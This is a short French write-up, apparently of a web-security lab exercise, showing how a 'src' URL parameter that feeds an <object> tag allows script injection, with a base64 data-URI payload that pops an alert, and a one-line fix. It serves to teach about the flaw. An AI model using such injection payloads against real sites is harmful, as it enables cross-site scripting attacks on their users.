# Explications
Dans la page "Index", il y une image cliquable avec le logo de la nsa qui nous envoie sur la page "media". On peut observer dans l'url un élément GET "**src=nsa**".
Si l'on change nsa par test, comme ceci :
<pre><code>http://IP/index.php?page=media&src=test</code></pre>
On observe que ce n'est plus la même image qui est chargée dans la page, de plus on observe dans le code de la paghe 

```html
<tr style="background-color:transparent;border:none;">
	<td style="vertical-align:middle;">
		<object data="test"></object>
	</td>
</tr>
```
L'objet chargé dépend donc du GET de l'URL. On peut donc injecter du code grâce a cela dans le site  de la maniere suivante.

<pre><code>http://IP/?page=media&src=data:text/html;base64,PHNjcmlwdD5hbGVydCgiaGFja2VkIik8L3NjcmlwdD4=</code></pre>
```html
data:text/html;base64 => Sert a indiquer le type du text qui suis.
<script>alert("hacked")</script> en base 64 : PHNjcmlwdD5hbGVydCgiaGFja2VkIik8L3NjcmlwdD4=
```

# Comment l'éviter ?
Il suffit de mettre la source de l'image directement dans le code plutot que de l'envoyer en paramètre GET